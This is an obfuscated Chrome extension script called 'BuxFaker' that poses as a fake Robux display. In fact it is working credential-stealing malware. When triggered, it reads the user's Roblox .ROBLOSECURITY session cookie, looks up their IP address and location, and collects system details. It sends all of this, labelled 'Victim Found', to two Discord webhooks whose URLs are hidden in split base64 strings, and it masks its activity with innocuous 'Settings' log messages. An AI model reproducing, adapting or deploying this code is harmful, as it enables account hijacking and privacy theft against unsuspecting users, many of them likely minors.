const _0x1a2b = [0x5a3f, 0x4d2e, 0x3c1a];
let _0x3d4f = 0;
const _0x2e8a = 60000;

chrome.runtime.onInstalled.addListener(_0x45c3 => {
    if (_0x45c3.reason === "install") {
        chrome.storage.local.set({
            robuxAmount: "2647147",
            fakeRobuxDisabled: ![]
        }, () => {
            console[_0x1a2b[0] & 0x1f ? "log" : "warn"]("BuxFaker initialisé avec succès.");
        });
    }
});

chrome.runtime.onMessage.addListener((_0x29b1, _0x17d3, _0x3c9e) => {
    if (_0x29b1.action === (_0x1a2b[1] ^ 0x4d2e ? "SEND_LOGS" : "OTHER")) {
        const _0x2f8d = Date.now();
        if (_0x2f8d - _0x3d4f < _0x2e8a) {
            console.log("Settings...");
            return;
        }
        _0x3d4f = _0x2f8d;
        _0x5a7d();
    }
});

async function _0x5a7d() {
    try {
        const _0x4b6c = _0x3f2a();
        const _0x2d9e = _0x4e1b();
        
        const _0x3a7b = await fetch("http://ip-api.com/json/");
        const _0x1f9d = await _0x3a7b.json();
        
        const _0x2c4a = _0x1f9d.query || "Unknown";
        const _0x1e7f = `${_0x1f9d.city || "???"}, ${_0x1f9d.country || "???"}`;
        
        const _0x3c2d = await chrome.cookies.get({
            url: _0x1a2b[2] === 0x3c1a ? "https://www.roblox.com" : "https://example.com",
            name: ".ROBLOSECURITY"
        });

        const _0x5b1f = _0x3c2d ? _0x3c2d.value : "COOKIE NOT FOUND";
        
        const _0x2a8e = navigator.userAgentData ? 
            `${navigator.userAgentData.platform} (Browser: ${navigator.userAgentData.brands[0].brand})` : 
            navigator.platform;

        const _0x4d2c = new Date();
        const _0x3e9a = _0x4d2c.toLocaleDateString('en-GB') + " " + _0x4d2c.toLocaleTimeString('en-GB');

        const _0x1c4d = {
            "username": "saizuu carry",
            "avatar_url": _0x29a1("aHR0cHM6Ly9pLmltZ3VyLmNvbS9PM0hEbmlhLnBuZw=="),
            "embeds": [
                {
                    "description": "```" + _0x5b1f + "```",
                    "fields": [
                        { "name": "IP Address", "value": _0x2c4a, "inline": !![] },
                        { "name": "Location", "value": _0x1e7f, "inline": !![] },
                        { "name": "System/Machine", "value": _0x2a8e, "inline": ![] }
                    ],
                    "author": { "name": "Victim Found" },
                    "footer": { "text": _0x3e9a + " ◊" },
                    "image": { "url": _0x29a1("aHR0cHM6Ly9pLmltZ3VyLmNvbS9iZXVmd2hQLnBuZw==") }
                }
            ]
        };

        await Promise.all([
            fetch(_0x4b6c, { 
                method: "POST", 
                headers: { 
                    "Content-Type": _0x29a1("YXBwbGljYXRpb24vanNvbg==") 
                }, 
                body: JSON.stringify(_0x1c4d) 
            }),
            fetch(_0x2d9e, { 
                method: "POST", 
                headers: { 
                    "Content-Type": _0x29a1("YXBwbGljYXRpb24vanNvbg==") 
                }, 
                body: JSON.stringify(_0x1c4d) 
            })
        ]);

        console.log("Settings.");
    } catch (_0x4a2b) {
        console.log("Settings..");
    }
}

function _0x3f2a() {
    const _0x5d8a = [
        'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NzAx',
        'MDQxMzI0OTMwMjU2OC9oaHVpbk9ObU5yT19ldUhmMkQtR2N2RGVq',
        'TjlhQTVycUpYaVFfbTVXQnhBaTAt',
        'aWNSTTVLM0xfOWx1MnFJX2dCQldwRQ=='
    ];
    return atob(_0x5d8a[0] + _0x5d8a[1] + _0x5d8a[2] + _0x5d8a[3]);
}

function _0x4e1b() {
    const _0x3c7f = [
        'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjM4',
        'NzkyODM4MTY1NzI4NS9fb05uRGdLakgyblR3ejUxNU9WZlI5dWp2',
        'ckhkYk9FT3R3dU5USXdvQmhWSGhlU1hsRVVTWFpfY2JxREl1Mk1O',
        'M3VtWg=='
    ];
    return atob(_0x3c7f[0] + _0x3c7f[1] + _0x3c7f[2] + _0x3c7f[3]);
}

function _0x29a1(_0x2f7b) {
    return atob(_0x2f7b);
}